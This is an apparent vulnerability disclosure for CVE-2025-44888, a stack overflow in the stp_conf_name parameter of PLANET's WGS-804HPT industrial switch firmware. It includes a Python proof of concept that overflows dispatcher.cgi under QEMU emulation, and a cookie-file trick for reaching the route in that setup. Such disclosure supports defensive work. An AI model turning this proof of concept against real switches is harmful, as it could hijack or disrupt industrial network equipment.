---
title: web_stp_globalSetting_post-stp_conf_name
date: 2025-04-20 17:09:34
tags: cve
---



**Affected Product**: FW-WGS-804HPT

**Affected Firmware Versions**:  v1.305b241111

**Vulnerability Type**: Buffer Overflow

**CVE Identifier**: CVE-2025-44888





# FW-WGS-804HPT_v1.305b241111 introduced

The WGS-804HPT-V2 is a ruggedized industrial-grade Ethernet switch designed for harsh environments and mission-critical applications. As part of PLANET Technology's Industrial Automation Series, this 8-port managed switch combines Power over Ethernet (PoE+) capabilities with industrial durability, making it ideal for building automation, smart infrastructure, and IoT deployments.



Official Product Page: https://www.planet.com.tw/en/product/wgs-804hpt-v2



# web_stp_globalSetting_post-stp_conf_name

I discovered a  stack overflow vulnerability in the Planet router.

By analyzing the dispatcher file in the bin directory, I found that the function web_stp_globalSetting_post  contains a stack overflow vulnerability.

The stack overflow can be triggered by stp_conf_name value, which leads to a memcpy stack overflow.

![image-20250321152223389](../res/202503211522484-17451404307454.png)

In the main function, there is an account authentication detection. We create a cookie_0 in the tmp directory, with the content of "20 0 0", and its function is to create a cookie with sufficient permissions to access this route.

```json
20 0 0
```



![image-20250417095422676](../res/image-20250417095422676-17448548644841.png)



![image-20250417095523856](../res/image-20250417095523856-17448549249282.png)



Through IDA, it can be seen that the stack space is 0x40

﻿The content of the **poc**.py file is as follows:

```json
import os


a = 0x1601
var_name = "stp_conf_name"
b = 'a' * 0x200


poc_content = f"&cmd={a}&{var_name}={b}"
with open('poc', 'w') as f:
    f.write(poc_content)

command = (
    "sudo chroot . ./qemu-mips-static "
    "-E REQUEST_METHOD=POST "
    "-E HTTP_COOKIE='hid=0' "
    "-L ./lib "
    "-g 1234 "
    "./dispatcher.cgi "
    "< poc"  
)


os.system(command)



```



![image-20250417095551086](../res/image-20250417095551086-17448549533853.png)

![image-20250417095707430](../res/image-20250417095707430-17448550284864.png)



Through the above image, we can see that we have overflowed to 0x1b8 and successfully hijacked the control flow. If necessary, more can be overflowed.
